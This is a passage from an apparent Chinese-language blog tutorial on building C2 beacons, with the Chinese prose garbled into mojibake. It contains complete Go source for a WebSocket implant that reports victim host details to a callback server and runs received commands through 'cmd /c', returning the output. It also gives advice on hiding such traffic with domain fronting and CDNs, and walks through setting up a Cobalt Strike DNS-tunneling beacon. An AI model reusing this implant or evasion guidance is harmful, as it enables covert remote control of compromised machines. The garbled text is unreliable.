</span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:8080&quot;</span>,  </span><br><span class="line">    URI:             <span class="string">&quot;/ws&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  </span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="comment">// æ‹¨å· + WS æ¡æ‰‹  </span></span><br><span class="line">    u := url.URL&#123;Scheme: <span class="string">&quot;ws&quot;</span>, Host: beaconProfile.CallBackAddress, Path: beaconProfile.URI&#125;  </span><br><span class="line">    conn, _, err := websocket.DefaultDialer.Dial(u.String(), <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;dial: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å‘é€ä¸Šçº¿åŒ…  </span></span><br><span class="line">    data, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;marshal heartbeat: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, data); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;send online: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Println(<span class="string">&quot;a connection was successfully established&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// è¯»å–å‘½ä»¤  </span></span><br><span class="line">       _, cmdLine, err := conn.ReadMessage()  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> err == io.EOF &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;server gone&quot;</span>)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;read: %v&quot;</span>, err)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span> <span class="type">string</span>(cmdLine) != <span class="string">&quot;server ok&quot;</span> &#123;  </span><br><span class="line">          <span class="comment">// æ‰§è¡Œå‘½ä»¤  </span></span><br><span class="line">          cmd := exec.Command(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="type">string</span>(cmdLine))  </span><br><span class="line">          <span class="keyword">var</span> outBuf, errBuf bytes.Buffer  </span><br><span class="line">          cmd.Stdout = &amp;outBuf  </span><br><span class="line">          cmd.Stderr = &amp;errBuf  </span><br><span class="line">          err = cmd.Run()  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// è·å–è¾“å‡º  </span></span><br><span class="line">          output := outBuf.String()  </span><br><span class="line">          <span class="keyword">if</span> output == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">             output = errBuf.String()  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; output == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">             output = err.Error()  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// å›ä¼ ç»“æœ  </span></span><br><span class="line">          <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(output)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;write: %v&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-3-æµé‡åˆ†æ"><a href="#3-3-æµé‡åˆ†æ" class="headerlink" title="3.3 æµé‡åˆ†æ"></a>3.3 æµé‡åˆ†æ</h2><p><code>Connection: Upgrade+Upgrade: websocket</code> è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªHTTPå‡çº§WebSocketçš„è¯·æ±‚åŒ…</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-40-55-d3d9663f45f626ee7500c36f156c0c6d-20250916214055-fc5644.png"></p>
<p>æœåŠ¡å™¨è¿”å›å“åº”ï¼Œè½¬æ¢åè®®</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-45-48-c5c544df52d2f8877539740b0d91ec59-20250916214547-3db09b.png"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯Beaconç»™Serverçš„å¿ƒè·³åŒ…æ•°æ®ï¼Œå¾ˆæ˜æ˜¾è¿™æ˜¯æ˜æ–‡æ•°æ®ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/16/21-47-27-b553be5f736b2d6d8bcc4ab63e322d93-20250916214726-6f4109.png"></p>
<p>çœ‹äº†æµé‡åˆ†æä¹‹åï¼Œåˆæœ‰äº†æ”¹è¿›æ–¹å‘ï¼Œæˆ‘å¤ªæ‡’äº†å°±ä¸å†™äº†ï¼Œåœ¨è¿™é‡Œç»™æ€è·¯</p>
<ol>
<li>ä½¿ç”¨HTTPåè®®è¯·æ±‚å»ºç«‹WSSè¿æ¥ï¼ŒBeaconç«¯ä¿®æ”¹ <code>url.URL</code> å’Œ <code>websocket.Dialer</code> æœ‰ç›¸å…³å‚æ•°ï¼›Serveråœ¨ä½¿ç”¨http.Serveråˆ›å»ºserverå¯¹è±¡æ—¶å¯ä»¥é…ç½®tlsè¯ä¹¦å‚æ•°ï¼Œå…·ä½“æ€ä¹ˆå†™æ‰¾èµ„æ–™ã€‚</li>
<li>æ—¢ç„¶æ¶‰åŠåˆ°HTTPæœåŠ¡å™¨ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹è¯·æ±‚å¤´ï¼Œé™¤æ­¤ä¹‹å¤–ä¹Ÿå¯ä»¥èµ·ä¸€ä¸ªæŸæŸåå°ç®¡ç†ç³»ç»Ÿçš„htmlé¡µé¢</li>
<li>å‡çº§WebSocketçš„uriè·¯å¾„å¯ä»¥ä¿®æ”¹æˆ <code>/api/v1/sync</code> ç­‰ç¬¦åˆåƒRESTé£æ ¼çš„å½¢å¼</li>
<li>è¿˜æ˜¯å› ä¸ºç”¨åˆ°äº†HTTPåè®®ï¼Œ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸŸåå‰ç½®+CDN éšè—çœŸå®vpsçš„IP</li>
<li>etc ..</li>
</ol>
<h1 id="å››ã€DNS"><a href="#å››ã€DNS" class="headerlink" title="å››ã€DNS"></a>å››ã€DNS</h1><p>ç»ˆäºæ˜¯æ¥åˆ°æœ¬æ–‡ä¸­æœ€å…·æœ‰æŒ‘æˆ˜æ€§å’Œç ”ç©¶ä»·å€¼çš„C2é€šä¿¡åè®®â€”â€”DNSï¼Œä¹Ÿæ˜¯æœ¬äººè‡ªè®¤ä¸ºå†™çš„è¿˜è¡Œçš„éƒ¨åˆ†ï¼Œå¸Œæœ›å¯¹å„ä½å¸ˆå‚…æœ‰ä¸€ç‚¹ç‚¹å¸®åŠ©ã€‚</p>
<h2 id="4-1-å‰ç½®çŸ¥è¯†"><a href="#4-1-å‰ç½®çŸ¥è¯†" class="headerlink" title="4.1 å‰ç½®çŸ¥è¯†"></a>4.1 å‰ç½®çŸ¥è¯†</h2><h3 id="ï¼ˆä¸€ï¼‰DNSåè®®"><a href="#ï¼ˆä¸€ï¼‰DNSåè®®" class="headerlink" title="ï¼ˆä¸€ï¼‰DNSåè®®"></a>ï¼ˆä¸€ï¼‰DNSåè®®</h3><p><strong>DNS</strong>ï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰æ˜¯äº’è”ç½‘ä¸­ç”¨äºå°†åŸŸåè½¬æ¢ä¸º IP åœ°å€çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç”±äºç»å¤§å¤šæ•°ä¼ä¸šé˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿéƒ½å…è®¸å†…éƒ¨ç½‘ç»œä¸»æœºå‘å¤–å‘èµ·DNSæŸ¥è¯¢ï¼ˆUDP 53ç«¯å£ï¼‰ï¼Œå¹¶ä¸”é€šå¸¸ä¸ä¼šæ·±å…¥æ£€æŸ¥æ¯ä¸ªDNSæ•°æ®åŒ…çš„æœ‰æ•ˆè½½è·æ˜¯å¦åˆè§„ï¼Œè¿™ç§é€šä¿¡æ–¹å¼å¾—ä»¥æ··æ‚åœ¨æµ·é‡çš„æ­£å¸¸DNSæµé‡ä¸­ï¼Œéš¾ä»¥è¢«å¯Ÿè§‰ã€‚</p>
<p> åœ¨C2ä¸­æˆ‘ä»¬å¯ä»¥å€ŸåŠ©DNSåè®®å°†é€šä¿¡æµé‡ä¼ªè£…æˆæ­£å¸¸çš„DNSæŸ¥è¯¢ä»è€Œæœ‰æ•ˆåœ°è§„é¿å®‰å…¨é˜²æŠ¤è½¯ä»¶çš„æ£€æµ‹ï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸º<strong>DNSéš§é“ï¼ˆDNS Tunnelingï¼‰</strong>ã€‚</p>
<blockquote>
<p><strong>éš§é“</strong>ï¼šå°±æ˜¯æŠŠä¸€ç§åè®®çš„æ•°æ®åŒ…ï¼ˆæˆ–å­—èŠ‚æµï¼‰å®Œæ•´å°è£…è¿›å¦ä¸€ç§åè®®çš„è½½è·ï¼ˆpayloadï¼‰é‡Œï¼Œè®©åè€…å……å½“â€œè¿è¾“å¡è½¦â€ï¼Œç©¿è¶ŠåŸæœ¬æ— æ³•ç›´æ¥é€šè¡Œçš„ç½‘ç»œè·¯å¾„ã€‚ã€‚</p>
</blockquote>
<p><strong>DNSç›‘å¬å™¨</strong>æ˜¯C2åŸºç¡€è®¾æ–½ä¸­æä¸ºç‰¹æ®Šä¸”å…³é”®çš„ä¸€ç±»æœåŠ¡ã€‚ä¸æ™®é€šDNSæœåŠ¡å™¨ä¸åŒï¼Œå®ƒå¹¶éç”¨äºè§£æåˆæ³•åŸŸåï¼Œè€Œæ˜¯ä¸“é—¨ç”¨äº<strong>è§£æç”±å—æ§ä¸»æœºå‘èµ·çš„ã€ä¼ªè£…æˆæ­£å¸¸DNSæŸ¥è¯¢çš„éšè”½é€šä¿¡</strong>ã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œæ”»å‡»è€…å¾—ä»¥å®ç°è¿œç¨‹å‘½ä»¤æ§åˆ¶å’Œæ•°æ®å›ä¼ ï¼Œä½¿å…¶æˆä¸ºç»•è¿‡ä¼ ç»Ÿç½‘ç»œé˜²å¾¡ä½“ç³»çš„<strong>æ ¸å¿ƒæ¢çº½</strong>ã€‚</p>
<p><strong>èµ„æºè®°å½•</strong>ï¼šä¹Ÿå°±æ˜¯DNSæ•°æ®åº“ä¸­çš„â€œä¸€è¡Œâ€ã€‚</p>
<p><strong>è®°å½•ç±»å‹</strong>ï¼šDNSæ•°æ®åº“é‡Œâ€œè¿™ä¸€è¡Œâ€åˆ°åº•å­˜äº†ä»€ä¹ˆç§ç±»çš„è®°å½•ã€‚å¸¸è§çš„è®°å½•ç±»å‹æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th align="left">ç±»å‹ä»£ç </th>
<th align="left">åç§°</th>
<th align="left">å«ä¹‰ä¸å…¸å‹ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>A</strong></td>
<td align="left">è¿”å›4å­—èŠ‚çš„IPv4åœ°å€ï¼Œå¸¸ç”¨éšè—æ§åˆ¶ä¿¡å·</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>NS</strong></td>
<td align="left">å°†æŸä¸ªåŸŸåŠå…¶å­åŸŸå§”æ‰˜ç»™å¦ä¸€ä¸ªDNSæœåŠ¡å™¨è§£æ</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>CNAME</strong></td>
<td align="left">å®ƒå¯ä»¥å°†ä¸€ä¸ªåŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå¸¸ç”¨äºCDNã€å¤šåŸŸåæŒ‡å‘åŒä¸€æœåŠ¡ç­‰</td>
</tr>
<tr>
<td align="left">16</td>
<td align="left"><strong>TXT</strong></td>
<td align="left">è¿”å›ä»»æ„æ–‡æœ¬</td>
</tr>
<tr>
<td align="left">28</td>
<td align="left"><strong>AAAA</strong></td>
<td align="left">è¿”å›16å­—èŠ‚çš„IPv6åœ°å€</td>
</tr>
</tbody></table>
<p>åœ¨C2é€šä¿¡åœºæ™¯é‡Œï¼Œæœ€å¸¸ç”¨çš„æ˜¯ï¼š<strong>A</strong>ã€<strong>TXT</strong> ã€<strong>AAAA</strong>ï¼Œâ‰¤4Bç”¨ Aï¼Œâ‰¤16Bç”¨AAAAï¼Œå¤§å—æ•°æ®ç”¨TXTåˆ†ç‰‡ï¼›</p>
<h3 id="ï¼ˆäºŒï¼‰æŠ¥æ–‡ç»“æ„"><a href="#ï¼ˆäºŒï¼‰æŠ¥æ–‡ç»“æ„" class="headerlink" title="ï¼ˆäºŒï¼‰æŠ¥æ–‡ç»“æ„"></a>ï¼ˆäºŒï¼‰æŠ¥æ–‡ç»“æ„</h3><p>æŠ¥æ–‡ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|        Header       |  12 å­—èŠ‚</span><br><span class="line">+---------------------+</span><br><span class="line">|       Question      |  é—®ä»€ä¹ˆåŸŸå/ç±»å‹</span><br><span class="line">+---------------------+</span><br><span class="line">|        Answer       |  ç­”ä»€ä¹ˆèµ„æºè®°å½•ï¼ˆRRï¼‰</span><br><span class="line">+---------------------+</span><br><span class="line">|      Authority      |  æƒå¨ NSï¼ˆå¯é€‰ï¼‰</span><br><span class="line">+---------------------+</span><br><span class="line">|      Additional     |  é™„åŠ ä¿¡æ¯ï¼ˆEDNS0 ç­‰ï¼‰</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p><code>dns.Msg</code> å®ç°äº†æŠ¥æ–‡ç»“æ„</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> Msg <span class="keyword">struct</span> &#123;  </span><br><span class="line">    MsgHdr  </span><br><span class="line">    Compress <span class="type">bool</span>       <span class="string">`json:&quot;-&quot;`</span> <span class="comment">// If true, the message will be compressed when converted to wire format.  </span></span><br><span class="line">    Question []Question <span class="comment">// Holds the RR(s) of the question section.  </span></span><br><span class="line">    Answer   []RR       <span class="comment">// Holds the RR(s) of the answer section.  </span></span><br><span class="line">    Ns       []RR       <span class="comment">// Holds the RR(s) of the authority section.  </span></span><br><span class="line">    Extra    []RR       <span class="comment">// Holds the RR(s) of the additional section.  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-2-Cobalt-Strike-DNS-Beaconä½¿ç”¨"><a href="#4-2-Cobalt-Strike-DNS-Beaconä½¿ç”¨" class="headerlink" title="4.2 Cobalt Strike DNS Beaconä½¿ç”¨"></a>4.2 Cobalt Strike DNS Beaconä½¿ç”¨</h2><p>åœ¨è®¡åˆ’ä¹‹åˆæˆ‘è¿˜æƒ³ä»‹ç»ä¸€ä¸‹sliver DNS beaconçš„ä½¿ç”¨ï¼Œå› ä¸ºsliveræ˜¯ä¸€ä¸ªå¼€æºçš„é¡¹ç›®ï¼Œæˆ‘å¯ä»¥ä¸€çª¥å¤§ä½¬ä»¬æ˜¯å¦‚ä½•å®ç°DNSç›‘å¬å™¨çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæˆ‘èŠ±äº†å‡ å¤©çš„æ—¶é—´éƒ½æ²¡èƒ½æˆåŠŸä¸Šçº¿sliver DNS beaconï¼Œæ‰€ä»¥è¿™é‡Œåªä»‹ç»Cobalt Strike DNS Beaconä½¿ç”¨ã€‚</p>
<h3 id="ï¼ˆä¸€ï¼‰æ³¨å†ŒåŸŸåå’Œæ·»åŠ è®°å½•"><a href="#ï¼ˆä¸€ï¼‰æ³¨å†ŒåŸŸåå’Œæ·»åŠ è®°å½•" class="headerlink" title="ï¼ˆä¸€ï¼‰æ³¨å†ŒåŸŸåå’Œæ·»åŠ è®°å½•"></a>ï¼ˆä¸€ï¼‰æ³¨å†ŒåŸŸåå’Œæ·»åŠ è®°å½•</h3><p>ä¸ºäº†è·Ÿè´´è¿‘å®æˆ˜ï¼Œæˆ‘ä»¬éœ€è¦å»å¯ä»¥äº‘æœåŠ¡æä¾›å•†ï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€awsã€godaddyå’Œcloudflareï¼‰æ³¨å†Œä¸€ä¸ªåŸŸåï¼Œå¦‚ä½•æ³¨å†Œæˆ‘å°±ä¸å†è¿™é‡Œæ¼”ç¤ºäº†ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘èŠ±è´¹å·¨èµ„æ³¨å†Œäº†ä¸€ä¸ªåŸŸåï¼Œåªä¸ºè´´è¿‘å®æˆ˜&gt;.&lt;</p>
<p><strong>è¿™é‡Œæ˜ç¡®ä¸€ç‚¹</strong>ï¼šä¸»æœºè®°å½•éƒ½æ˜¯åŸŸåï¼Œè®°å½•å€¼å¯ä»¥æ˜¯ipåœ°å€ä¹Ÿå¯ä»¥æ˜¯åŸŸåæˆ–è€…å…¶ä»–ï¼Œä¸»è¦çœ‹è®°å½•ç±»å‹ã€‚</p>
<p>æ¥åˆ° <code>äº‘è§£æDNS</code> -&gt; <code>è§£æé…ç½®</code> -&gt; <code>å…¬ç½‘æƒå¨è§£æ</code>ï¼Œæ·»åŠ è®°å½•</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-02-12-42ef32dd92e9c823a8fba4c95fd7138e-20250905130212-3f134e.png"></p>
<p>å¢åŠ ä¸€æ¡Aè®°å½•ï¼Œå°†ä¸»æœºè®°å½•éšæ„å¡«ï¼Œè®°å½•å€¼ä¸ºvpsçš„å…¬ç½‘ipåœ°å€ï¼Œè¿™æ ·åšçš„æ•ˆæœæ˜¯ <code>ns1.example.com</code> -&gt; <code>vpsçš„å…¬ç½‘ip</code> </p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-02-53-d3ad859ee71487a475ec171f25504500-20250905130253-97a291.png"></p>
<p>å¢åŠ ä¸€æ¡NSè®°å½•ï¼Œä¸»æœºè®°å½•éšæ„å¡«æ¯”å¦‚è¯´ <code>1</code>ï¼Œè®°å½•å€¼ä¸ºAè®°å½•çš„ä¸»æœºè®°å½• <code>ns1.example.com</code>ï¼Œè¿™æ ·åšçš„æ•ˆæœæ˜¯ä»»ä½•å…³äº <code>1.example.com</code> åŠå…¶å­åŸŸçš„DNSæŸ¥è¯¢éƒ½å°†å§”æ‰˜ç»™åŸŸåä¸º <code>ns1.example.com</code> çš„DNSæœåŠ¡å™¨è§£æã€‚è€Œ <code>ns1.example.com</code> æ­£æ˜¯å†ä¸Šä¸€æ­¥æ“ä½œä¸­å¢åŠ çš„Aè®°å½•ï¼Œä¹Ÿå°±æ„å‘³ç€ <code>1.example.com</code> åŠå…¶å­åŸŸæ˜¯äº¤ç”±æˆ‘ä»¬çš„vpsæ¥å¤„ç†ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-03-43-b3d4cfc86209efdfcc0d95d03bb502d6-20250905130342-a19008.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-04-17-ff22d47773fedcfdfe1f46c6543bb690-20250905130417-ccb77f.png"></p>
<p>å®Œæˆåï¼Œä»»ä½•å½¢å¦‚ <code>*.1.example.com</code> çš„æŸ¥è¯¢ï¼Œé€’å½’æœåŠ¡å™¨éƒ½ä¼šè½¬ç»™ <code>ns1.example.com</code> â†’ <code>vpsçš„å…¬ç½‘ip</code>ï¼›VPSåªéœ€åœ¨53ä¸Šè·‘æƒå¨DNSï¼ˆCobalt Strike&#x2F;Sliver&#x2F;è‡ªå†™è„šæœ¬çš†å¯ï¼‰ï¼Œå³å¯æ¥ç®¡è¯¥å­åŸŸçš„æ‰€æœ‰è§£æè¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤ä¸æ§åˆ¶çš„æ•ˆæœï¼</p>
<p>æ³¨å†Œå®Œåçš„DNSè®°å½•éœ€è¦ç­‰å¾…10åˆ†é’Ÿåæ‰èƒ½ç”Ÿæ•ˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨nslookupæˆ–è€…digæ¥æµ‹è¯•Aè®°å½•æ˜¯å¦ç”Ÿæ•ˆï¼ŒNSè®°å½•ä¹Ÿæ˜¯åŒç†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup ns1.example.com</span><br></pre></td></tr></table></figure>

<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-05-24-1a40f3932ebb4547b62dbcc9edde780a-20250905130524-4eaa18.png"></p>
<h3 id="ï¼ˆäºŒï¼‰åˆ›å»ºDNSç›‘å¬å™¨å¹¶å®Œæˆä¸Šçº¿"><a href="#ï¼ˆäºŒï¼‰åˆ›å»ºDNSç›‘å¬å™¨å¹¶å®Œæˆä¸Šçº¿" class="headerlink" title="ï¼ˆäºŒï¼‰åˆ›å»ºDNSç›‘å¬å™¨å¹¶å®Œæˆä¸Šçº¿"></a>ï¼ˆäºŒï¼‰åˆ›å»ºDNSç›‘å¬å™¨å¹¶å®Œæˆä¸Šçº¿</h3><p>æ˜¯æ—¶å€™è¯·å‡ºCSè€ç¥–äº†ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯CS4.9.1è¿›è¡Œæµ‹è¯•ï¼Œåœ¨æ¶‰åŠæºç åˆ†æçš„æ—¶å€™ç”¨çš„æ˜¯4.5ï¼Œè¯·æ³¨æ„åŒºåˆ†ï¼åœ¨vpsä¸Šå¯åŠ¨CSæœåŠ¡å™¨ï¼Œç„¶ååˆ›å»ºDNSç›‘å¬å™¨ï¼Œæœ€åè¿›è¡Œå¦‚ä¸‹é…ç½®</p>
<ul>
<li><code>DNS Hosts</code>ï¼šNSè®°å½•çš„åŸŸå</li>
<li><code>DNS Host (Stager)</code>ï¼šåœ¨DNS Hostsåˆ—è¡¨ä¸­éšä¾¿æŒ‘é€‰ä¸€ä¸ªNSè®°å½•çš„åŸŸåã€‚</li>
</ul>
<p>å‚æ•°çš„è¯´æ˜åœ¨cså®˜ç½‘ï¼š<a target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_beacon-dns.htm#_Toc65482739">DNS ä¿¡æ ‡</a></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-05-45-09aec0fb1786df0684d841ef6b8787e6-20250905130544-1ee14d.png"></p>
<p>ä¸Šçº¿åï¼Œä¼šè¯è¡¨é‡Œä¸»æœºå›¾æ ‡æ˜¾ç¤ºé»‘è‰²ï¼Œæ— ä¿¡æ¯ï¼Œä¸”ä¸èƒ½æ‰§è¡Œé™¤ <code>checkin</code> å‘½ä»¤ä¹‹å¤–çš„ä»»ä½•å‘½ä»¤ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-05-02-8bdb65447b3f57b9f8938810e19a9ac0-20250904210501-dcb8a3.png"></p>
<p>è¾“å…¥ <code>checkin</code> å‘½ä»¤ï¼Œå¼ºåˆ¶è®©ç›®æ ‡ä¸»æœºè¿”å›metadata, è¿™æ ·ä¸»æœºä¿¡æ¯å°±ä¼šæ˜¾ç°å‡ºæ¥ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-15-38-8b95c6bfdcb7a6f35e88f9a7a68d1d18-20250904211538-dcbd49.png"></p>
<p>æ­£å¸¸æ‰§è¡Œå‘½ä»¤</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-18-45-64913f652b8156ebf357440d20736f7e-20250904211844-8876de.png"></p>
<p>DNS Beaconæ”¯æŒä¸‰ç§ä¸åŒæ¨¡å¼çš„ä¼ è¾“æ•°æ®çš„æ–¹å¼ï¼Œå¯ä»¥è¾“å…¥å‘½ä»¤è¿›è¡Œåˆ‡æ¢</p>
<ul>
<li><code>mode dns</code>ï¼šä½¿ç”¨DNS Aè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ŒAè®°å½•æœ€å¸¸è§ï¼Œæœ€ä¸æ˜¾çœ¼ï¼Œä½†æ˜¯æºå¸¦çš„æ•°æ®é‡æœ€æœ‰é™ï¼ˆ4byteï¼‰</li>
<li><code>mode dns-txt</code>ï¼šä½¿ç”¨DNS TXTè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ŒTXTæŸ¥è¯¢è¾ƒä¸ºå°‘è§ï¼Œæ˜“è§¦å‘IDSç»Ÿè®¡ï¼Œæºå¸¦æ•°æ®é‡æœ€å¤šï¼ˆä¸åŒæ–¹çš„çº¦å®šæœ‰å…³ï¼Œå—å¤šæ–¹å› ç´ åˆ¶çº¦ï¼‰ï¼Œå¤§éƒ¨åˆ†åœºæ™¯ç”¨è¿™ç§æ¨¡å¼å°±è¡Œ</li>
<li><code>mode dns6</code>ï¼šä½¿ç”¨DNS AAAAè®°å½•ä½œä¸ºæ•°æ®é€šé“ï¼ŒAAAAè®°å½•é€æ¸å¸¸è§ï¼Œæºå¸¦æ•°æ®é‡ä¸€èˆ¬ï¼ˆ16 byteï¼‰</li>
</ul>
<p>âš æ³¨æ„ï¼šä¸Šè¿°ä¸‰ç§æ–¹å¼ä»…å†³å®š <strong>Serverâ†’Beaconçš„ä»»åŠ¡æ•°æ®å¦‚ä½•å°è£…</strong>ï¼ŒBeaconçš„ä¸Šä¼ æ•°æ®ä»é€šè¿‡å­åŸŸæ ‡ç­¾ç»„åˆå®Œæˆå›ä¼ ï¼Œåœ¨ä¸‹æ–‡ <code>4.3 æ€è·¯æ„å»º</code> ä¼šè¯¦ç»†è¯´æ˜DNS C2çš„å®ç°æ€è·¯ã€‚</p>
<h3 id="ï¼ˆä¸‰ï¼‰æµé‡åˆ†æ"><a href="#ï¼ˆä¸‰ï¼‰æµé‡åˆ†æ" class="headerlink" title="ï¼ˆä¸‰ï¼‰æµé‡åˆ†æ"></a>ï¼ˆä¸‰ï¼‰æµé‡åˆ†æ</h3><p>æœ€åçœ‹çœ‹wiresharkçš„æµé‡ï¼Œæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼ŒåªæŸ¥çœ‹ç›¸å…³çš„dnsæ•°æ®åŒ…ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns and dns.qry.name contains &quot;1.abcplus.xyz&quot;</span><br></pre></td></tr></table></figure>

